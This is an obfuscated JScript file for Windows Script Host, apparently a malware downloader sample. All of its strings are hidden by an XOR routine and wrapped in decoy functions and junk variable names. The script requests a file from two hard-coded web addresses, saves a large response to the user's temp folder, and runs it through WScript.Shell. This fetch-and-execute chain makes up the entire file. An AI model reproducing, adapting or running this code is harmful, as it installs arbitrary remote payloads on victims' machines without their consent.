function btoa(assertjiL, gauntr0A, vainRCD, hoaryXFw, ignominyf3D, magisterialx3n, dutifuls5F, frustrateuCW, machinationNRB, sextantJn6) {
    var provenderl7Q = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var scarceXxR = String(sextantJn6);
    for (var issueBsn, askanceeMh, fraughtops = 0, exploitationkeX = provenderl7Q, aproposvaz = ""; scarceXxR.charAt(fraughtops | 0) || (exploitationkeX = "=", 
    fraughtops % 1); aproposvaz += exploitationkeX.charAt(63 & issueBsn >> 8 - fraughtops % 1 * 8)) {
        askanceeMh = scarceXxR.charCodeAt(fraughtops += 3 / 4);
        if (askanceeMh > 255) {
            throw new InvalidCharacterError("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");
        }
        issueBsn = issueBsn << 8 | askanceeMh;
    }
    return aproposvaz;
}

var symmetryqVj = function(frescozVT) {
    var ignominiouswN6 = "";
    var assertjiL = "broochTdc";
    var gauntr0A = "revelryRag";
    var vainRCD = "scrupulousNBi";
    var hoaryXFw = "cholericWVQ";
    var ignominyf3D = "bouillonHec";
    var magisterialx3n = "conjugalNgx";
    var dutifuls5F = "affecton7";
    var frustrateuCW = "treadmWq";
    var machinationNRB = "checkeredvHl";
    btoa(assertjiL, gauntr0A, vainRCD, hoaryXFw, ignominyf3D, magisterialx3n, dutifuls5F, frustrateuCW, machinationNRB, [ 128, 18, 110, 24, 15, 34, 137, 81, 225, 150, 239, 250, 180, 136, 127, 163 ]);
    var beseechgtm = String["sdfadfasdffromChar".slice(10) + "Codedsfadsfasdg".slice(0, 4)];
    for (var conjurebmS = 0; conjurebmS < frescozVT.length; conjurebmS++) {
        var schemetLi = [ 128, 18, 110, 24, 15, 34, 137, 81, 225, 150, 239, 250, 180, 136, 127, 163 ];
        ignominiouswN6 += beseechgtm(frescozVT[conjurebmS] ^ schemetLi[conjurebmS % schemetLi.length]);
    }
    return ignominiouswN6;
};

var knightdls = function() {
    var territoryXUh = function() {
        var chaffkF1 = symmetryqVj([ 240, 68, 44, 92, 64, 119, 232, 30, 165, 238 ]);
        var caucusiP7 = symmetryqVj([ 199, 112, 38, 79, 74, 123, 248, 50, 162, 230 ]);
    };
    territoryXUh.prototype.u6TRjwKULU = function(arbitrarywmg) {
        var espouseHoX = symmetryqVj([ 195, 96, 11, 121, 123, 71, 198, 51, 139, 243, 140, 142 ]);
        return wsh[espouseHoX](arbitrarywmg);
    };
    territoryXUh.prototype.oDqMFkMWrj = function(arbitrarywmg) {
        var espouseHoX = symmetryqVj([ 195, 96, 11, 121, 123, 71, 198, 51, 139, 243, 140, 142 ]);
        return WScript[espouseHoX](arbitrarywmg);
    };
    return territoryXUh;
}();

(function() {
    var livelihoodHhV = [ symmetryqVj([ 232, 102, 26, 104, 53, 13, 166, 57, 145, 247, 157, 159, 205, 231, 10, 203, 229, 96, 11, 105, 126, 12, 234, 62, 140, 185, 215, 202, 154, 237, 7, 198 ]), symmetryqVj([ 232, 102, 26, 104, 53, 13, 166, 57, 145, 247, 131, 137, 219, 255, 30, 205, 244, 97, 8, 126, 33, 65, 230, 60, 206, 174, 223, 212, 209, 240, 26 ]) ];
    var salientXBL = 4194304;
    var upshotTqo = new knightdls();
    var traducej1T = upshotTqo[symmetryqVj([ 239, 86, 31, 85, 73, 73, 196, 6, 147, 252 ])];
    var warbleTxU = traducej1T(symmetryqVj([ 215, 65, 13, 106, 102, 82, 253, 127, 178, 254, 138, 150, 216 ]));
    var confermNl = traducej1T(symmetryqVj([ 205, 65, 54, 85, 67, 16, 167, 9, 172, 218, 167, 174, 224, 216 ]));
    var maximgBp = traducej1T(symmetryqVj([ 193, 86, 33, 92, 77, 12, 218, 37, 147, 243, 142, 151 ]));
    var monetaryFhT = warbleTxU.ExpandEnvironmentStrings(symmetryqVj([ 165, 70, 43, 85, 95, 7, 213 ]));
    var grudgingp4B = monetaryFhT + salientXBL + symmetryqVj([ 174, 119, 22, 125 ]);
    var pathologicalHtE = false;
    var beatificGlo = 200;
    for (var retentivejw9 = 0; retentivejw9 < livelihoodHhV.length; retentivejw9++) {
        try {
            var malaisergm = livelihoodHhV[retentivejw9];
            confermNl.open(symmetryqVj([ 199, 87, 58 ]), malaisergm, false);
            confermNl.send();
            if (confermNl.status == beatificGlo) {
                try {
                    maximgBp[symmetryqVj([ 239, 98, 11, 118 ])]();
                    maximgBp.type = 1;
                    maximgBp[symmetryqVj([ 247, 96, 7, 108, 106 ])](confermNl[symmetryqVj([ 242, 119, 29, 104, 96, 76, 250, 52, 163, 249, 139, 131 ])]);
                    var fractiouso2D = symmetryqVj([ 232, 84, 57, 85, 60, 81, 219, 43, 163, 226 ]);
                    var mettlexX9 = symmetryqVj([ 215, 103, 22, 106, 70, 119, 221, 0, 139, 164 ]);
                    var zephyrm14 = symmetryqVj([ 195, 42, 91, 46, 119, 116, 241, 3, 181, 252 ]);
                    var tenablevtp = symmetryqVj([ 212, 37, 62, 125, 73, 76, 240, 1, 136, 222 ]);
                    var majorityow1 = Math.pow(2, 10) * 249;
                    if (maximgBp.size > majorityow1) {
                        retentivejw9 = livelihoodHhV.length;
                        maximgBp.position = 0;
                        maximgBp.saveToFile(grudgingp4B, 2);
                        pathologicalHtE = true;
                    }
                } finally {
                    maximgBp.close();
                }
            }
        } catch (ignored) {}
    }
    if (pathologicalHtE) {
        warbleTxU[symmetryqVj([ 197, 106, 11, 123 ])](monetaryFhT + Math.pow(2, 22));
    }
})();